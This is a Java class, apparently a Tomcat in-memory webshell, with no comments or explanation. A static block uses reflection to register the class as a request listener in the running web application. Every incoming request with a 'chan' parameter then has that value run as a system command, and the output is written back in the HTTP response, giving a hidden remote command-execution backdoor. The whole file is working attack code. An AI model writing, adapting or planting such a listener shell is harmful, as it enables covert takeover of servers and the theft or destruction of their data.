import jakarta.servlet.ServletRequestEvent;
import jakarta.servlet.ServletRequestListener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class LRain10 implements ServletRequestListener {

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            LRain10 servletRequestListener = new LRain10();
            Method addlistener = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addApplicationEventListener", Object.class);
            addlistener.invoke(standardContext,servletRequestListener);

        } catch (Exception hi) {
            //hi.printStackTrace();
        }
    }


    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try{
            RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request lrequest = (Request) field.get(requestfacade);
            Response lresponse = lrequest.getResponse();

            if(lrequest.getParameter("chan") != null){
                Process process = Runtime.getRuntime().exec(lrequest.getParameter("chan"));
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                lresponse.getOutputStream().write(stringBuilder.toString().getBytes());
                lresponse.getOutputStream().flush();
                lresponse.getOutputStream().close();
                return;
            }
        }catch(Exception ig){
            ig.printStackTrace();
        }
    }
}

